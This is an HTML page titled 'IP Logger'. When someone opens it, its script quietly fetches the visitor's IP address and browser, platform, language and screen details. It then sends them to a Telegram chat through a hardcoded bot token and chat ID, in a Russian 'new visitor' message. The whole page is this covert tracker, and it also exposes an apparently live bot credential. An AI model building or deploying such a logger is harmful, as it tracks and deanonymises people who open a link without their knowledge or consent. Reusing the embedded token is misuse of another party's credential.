<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IP Logger</title>
</head>
<body>

    <script>

        const TELEGRAM_TOKEN = '8014763076:AAEjH-oM5ZHbUNGumTwQUQKai0XmdeWYwUc';
        const CHAT_ID = 639840324;


        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'Не удалось определить IP';
            }
        }

        function getBrowserInfo() {
            return `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${screen.width}x${screen.height}`;
        }


        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }


        async function logVisitor() {
            const ip = await getIP();
            const browser = getBrowserInfo();
            const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const msg = `<b>Новый посетитель</b>\nВремя: ${time}\nIP: ${ip}\n${browser}`;
            await sendToTelegram(msg);
        }

        logVisitor();
    </script>
</body>
</html>
